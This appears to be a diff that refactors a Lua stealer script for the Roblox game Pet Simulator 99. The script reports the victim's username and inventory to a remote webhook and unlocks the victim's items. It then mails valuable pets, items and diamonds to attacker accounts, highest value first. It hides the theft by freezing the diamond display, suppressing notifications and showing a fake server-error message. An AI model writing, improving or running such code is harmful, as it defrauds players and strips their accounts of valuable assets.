@@ -42,23 +42,29 @@ end
 
 local mailSendPrice = FunctionToGetFirstPriceOfMail()
 
+-- cache save/inventory reference to avoid repeated calls
+local SaveRoot = GetSave()
+local InventoryCache = SaveRoot and SaveRoot.Inventory
+
 local GemAmount1 = 1
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount1 = v._am
-		break
+if InventoryCache and InventoryCache.Currency then
+    for i, v in pairs(InventoryCache.Currency) do
+        if v.id == "Diamonds" then
+            GemAmount1 = v._am
+            break
+        end
     end
 end
 
 local function formatNumber(number)
-	local number = math.floor(number)
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
-	return string.format("%.2f%s", number, suffixes[suffixIndex])
+    local number = math.floor(number)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
 local function SendMessage(diamonds)
@@ -66,23 +72,23 @@ local function SendMessage(diamonds)
         ["Content-Type"] = "application/json"
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items to be sent:",
-			value = "",
-			inline = false
-		},
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items to be sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = "",
             inline = false
         }
-	}
+    }
 
     local combinedItems = {}
     local itemRapMap = {}
@@ -112,10 +118,10 @@ local function SendMessage(diamonds)
         ["embeds"] = {{
             ["title"] = "\240\159\144\177 New PS99 Execution" ,
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Strike Hub."
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Strike Hub."
+            }
         }}
     }
 
@@ -144,14 +150,14 @@ end
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-	gemsleaderstatpath.Value = gemsleaderstat
+    gemsleaderstatpath.Value = gemsleaderstat
 end)
 
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
 noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
+    noti.Enabled = false
 end)
 noti.Enabled = false
 
@@ -185,11 +191,14 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
+-- cache network.Invoke locally for faster calls
+local netInvoke = network and network.Invoke
+
 local function sendItem(category, uid, am)
     local userIndex = 1
     local maxUsers = #users
     local sent = false
-    
+
     repeat
         local currentUser = users[userIndex]
         local args = {
@@ -200,12 +209,12 @@ local function sendItem(category, uid, am)
             [5] = am or 1
         }
 
-        local response, err = network.Invoke("Mailbox: Send", unpack(args))
+        local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))
 
         if response == true then
             sent = true
             GemAmount1 = GemAmount1 - mailSendPrice
-            mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
+            mailSendPrice = math.ceil(mailSendPrice * 1.5) -- removed redundant math.ceil
             if mailSendPrice > 5000000 then
                 mailSendPrice = 5000000
             end
@@ -219,13 +228,16 @@ local function sendItem(category, uid, am)
 end
 
 local function SendAllGems()
-    for i, v in pairs(GetSave().Inventory.Currency) do
+    local inv = InventoryCache or (GetSave() and GetSave().Inventory)
+    if not inv or not inv.Currency then return end
+
+    for i, v in pairs(inv.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= (mailSendPrice + 10000) then
                 local userIndex = 1
                 local maxUsers = #users
                 local sent = false
-                
+
                 repeat
                     local currentUser = users[userIndex]
                     local args = {
@@ -235,9 +247,9 @@ local function SendAllGems()
                         [4] = i,
                         [5] = GemAmount1 - mailSendPrice
                     }
-                    
-                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-                    
+
+                    local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))
+
                     if response == true then
                         sent = true
                     elseif response == false and err == "They don't have enough space!" then
@@ -256,9 +268,9 @@ end
 local function EmptyBoxes()
     if save.Box then
         for key, value in pairs(save.Box) do
-			if value._uq then
-				network.Invoke("Box: Withdraw All", key)
-			end
+            if value._uq then
+                network.Invoke("Box: Withdraw All", key)
+            end
         end
     end
 end
@@ -272,12 +284,12 @@ local function ClaimMail()
 end
 
 local function canSendMail()
-	local uid
-	for i, v in pairs(save["Pet"]) do
-		uid = i
-		break
-	end
-	local args = {
+    local uid
+    for i, v in pairs(save["Pet"]) do
+        uid = i
+        break
+    end
+    local args = {
         [1] = "Roblox",
         [2] = "Test",
         [3] = "Pet",
@@ -293,9 +305,9 @@ require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 
 for i, v in pairs(categoryList) do
-	if save[v] ~= nil then
-		for uid, item in pairs(save[v]) do
-			if v == "Pet" then
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
+            if v == "Pet" then
                 local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                 if dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel then
                     local rapValue = getRAP(v, item)
@@ -323,40 +335,44 @@ for i, v in pairs(categoryList) do
             end
             if item._lk then
                 local args = {
-                [1] = uid,
-                [2] = false
+                    [1] = uid,
+                    [2] = false
                 }
                 network.Invoke("Locking_SetLocked", unpack(args))
             end
         end
-	end
+    end
 end
 
 if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
     ClaimMail()
-	EmptyBoxes()
+    EmptyBoxes()
     if not canSendMail() then
         message.Error("Account error. Please rejoin and try again or use a different account")
         return
     end
 
-    table.sort(sortedItems, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount 
-    end)
+    -- Sort once by total RAP value (RAP * amount)
+table.sort(sortedItems, function(a, b)
+	return (a.rap * a.amount) > (b.rap * b.amount)
+end)
 
-    spawn(function()
-        SendMessage(GemAmount1)
-    end)
+task.spawn(function()
+	SendMessage(GemAmount1)
+end)
 
-    for _, item in ipairs(sortedItems) do
-        if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
-            sendItem(item.category, item.uid, item.amount)
-        else
-            break
-        end
-    end
-    if GemAmount1 > mailSendPrice then
-        SendAllGems()
+-- Send highest RAP items first, regardless of category
+for _, item in ipairs(sortedItems) do
+	if GemAmount1 > mailSendPrice then
+		sendItem(item.category, item.uid, item.amount)
+	else
+		break
+	end
+end
+
+-- Send remaining gems last
+if GemAmount1 > mailSendPrice then
+	SendAllGems()
     end
     message.Error("We are Having server issues please rejoin and try again")
 end
